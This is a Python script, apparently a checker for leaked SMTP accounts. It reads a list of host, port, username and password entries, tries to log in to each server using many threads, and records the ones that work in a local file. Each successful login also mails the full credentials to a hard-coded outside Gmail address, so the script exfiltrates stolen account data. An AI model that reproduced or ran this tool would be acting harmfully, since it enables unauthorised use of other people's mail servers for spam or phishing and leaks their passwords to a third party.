#!/usr/bin/python3
#Dinar, fb.com/dinar1337
import smtplib as smtp
from smtplib import *
from threading import *
from threading import Thread
import multiprocessing as Executor
from queue import Queue
import sys, os, ssl, colorama
from email import message

class ColoR(object):
	def __init__(self):
		colorama.init()
		self.CLEAR_SCREEN = '\033[2J'
		self.RESET = '\033[0m'		# mode 0  = reset
		self.RED = '\033[31m'		# mode 31 = red forground
		self.GREEN = '\033[32m'		# mode 32 = green forground
		self.YELLOW = '\033[33m'	# mode 33 = yellow forground
		self.BLUE = '\033[34m'		# mode 34 = blue forground
		self.MAGENTA = '\033[35m'	# mode 35 = Magenta forground
		self.CYAN = '\033[36m'		# mode 36 = Cyan forground
		self.WHITE = '\033[37m'		# mode 37 = white forground

class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try:
				func(*args, **kargs)
			except Exception as e: 
				print(e)
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()

def save(a,b):
    x = open(b,'a+')
    x.write(a)
    x.close()

def check(sm):
    try:
        c = ColoR()
        m = message.Message()
        x = sm.replace('\n','')
        o = x.split("|",6)
        msg = "\nHOST: " + str(o[0]) + "\nPORT: " + str(o[1]) + "\nUSERNAME: " + str(o[2]) + "\nPASSWORD: " + str(o[3]) + "\nMAIL_FROM" + str(o[4])
        if '@' in str(o[4]):
            email = str(o[4])
        else:
            email = "jasonmr85@gmail.com"
        m.add_header('from', email)
        m.add_header('to', 'palkna3@gmail.com')
        m.add_header('subject', 'TEST SMTP')
        m.set_payload(msg)
        if o[1] == 465:
            context = ssl.create_default_context()
            server = smtp.SMTP_SSL(host=o[0],port=o[1],context=context)
        else:
            server = smtp.SMTP(host=o[0],port=o[1])
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(o[2],o[3])
        server.sendmail(email,'palna3@gmail.com',m.as_string())
        server.quit()
        print(c.GREEN + "SMTP Active : " + str(o[2]))
        save(msg,'active.txt')
    except SMTPAuthenticationError:
        print(c.RED + "SMTP Authentication Error " + str(o[2]) + c.RESET)
    except SMTPServerDisconnected:
        print(c.RED + "SMTP Server Disconnected " + str(o[0]) + ":" + str(o[1]) + c.RESET)
    except SMTPResponseException:
        print(c.RED + "SMTP Error " + str(o[0]) + ":" + str(o[1]) + c.RESET)
    except Exception as e:
        print(e)
    except:
        raise ValueError
if __name__=='__main__':
    try:
        p = input("SMTP LIST : ")
        pool = ThreadPool(10)
        readsplite = open(p).read().splitlines()
        for sm in readsplite:
            pool.add_task(check,sm)
        pool.wait_completion()
    except Exception as e:
        print(e)
